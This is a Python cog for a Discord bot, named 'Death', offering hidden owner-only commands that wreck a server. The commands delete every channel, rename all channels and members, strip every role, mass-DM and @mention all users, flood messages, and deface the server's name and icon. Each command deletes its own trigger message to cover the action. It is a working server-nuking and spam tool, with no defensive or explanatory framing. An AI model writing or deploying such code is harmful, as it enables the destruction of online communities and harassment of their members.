import discord
from discord.ext import commands
from random import choice as rndchoice
from .utils.dataIO import fileIO
from .utils import checks
import os
from __main__ import set_cog, send_cmd_help, settings
from .utils.dataIO import fileIO
import importlib
from cogs.utils import chat_formatting
import traceback
import logging
import asyncio
import threading
import datetime
import glob
import time
import aiohttp

log = logging.getLogger("red.owner")

class Death:
    def __init__(self, bot):
        self.bot = bot

    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def death(self, ctx):
        await self.bot.delete_message(ctx.message)
        await self.bot.say("Get ready for DEATH")

    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def delchannels(self, ctx):
        await self.bot.delete_message(ctx.message)
        channels = list(ctx.message.server.channels)
        for channel in channels:
            try:
                await self.bot.delete_channel(channel)
                asyncio.sleep(0.25)
                log.debug("Deleted channel {}".format(channel.name))
            except Exception as e:
                log.debug("Error deleting channel {}".format(channel.name))

    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def editchannels(self, ctx, *, newname : str):
        await self.bot.delete_message(ctx.message)
        channels = list(ctx.message.server.channels)
        for channel in channels:
            try:
                await self.bot.edit_channel(channel, name=newname)
                asyncio.sleep(0.25)
                log.debug("Editted channel {} to {}".format(channel.name, newname))
            except Exception as e:
                log.debug("cool")

    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def nicknameall(self, ctx, *, nickname : str):
        await self.bot.delete_message(ctx.message)
        for user in ctx.message.server.members:
            try:
                await self.bot.change_nickname(user, nickname)
                log.debug("Renamed {} to {}".format(user.name, nickname))
            except Exception as e:
                log.debug("Error renaming {} to {}".format(user.name, nickname))

    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def striproles(self, ctx):
        await self.bot.delete_message(ctx.message)
        for user in ctx.message.server.members:
            for role in user.roles:
                try:
                    await self.bot.remove_roles(user, role)
                    log.debug("Removed {} from {}".format(role, user.name))
                except Exception as e:
                    log.debug("Error removing {} from {}".format(role, user.name))

    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def dmall(self, ctx, *, message : str):
        await self.bot.delete_message(ctx.message)
        for user in ctx.message.server.members:
            try:
                await self.bot.send_message(user, message)
                log.debug("Sent message to {}".format(user.name))
            except Exception as e:
                log.debug("Error sending message to {}".format(user.name))
                
    @commands.command(pass_context=True, no_pm=True, hidden=True)
    @checks.is_owner()
    async def serverdeath(self, ctx, newname : str):
        await self.bot.delete_message(ctx.message)
        server = ctx.message.server
        await self.bot.edit_server(server, name=newname)
        await self.bot.edit_server(server, icon=None)
        await self.bot.edit_server(server, region='brazil')

    @commands.command(pass_context=True, hidden=True)
    @checks.is_owner()
    async def spam(self, ctx, number : int, *, message : str):
        await self.bot.edit_message(ctx.message, 'hi')
        this = int(0)
        while this != number:
            await asyncio.sleep(1)
            await self.bot.say(message)
            this += 1
        await self.bot.delete_message(ctx.message)

    @commands.command(pass_context=True, hidden=True)
    @checks.is_owner()
    async def mentionall(self, ctx):
        data = ''
        for user in ctx.message.server.members:
            data += user.mention
        paged = chat_formatting.pagify(data, delims=" ")
        for page in paged:
            await self.bot.say("{0}".format(page))


def setup(bot):
    n = Death(bot)
    bot.add_cog(n)
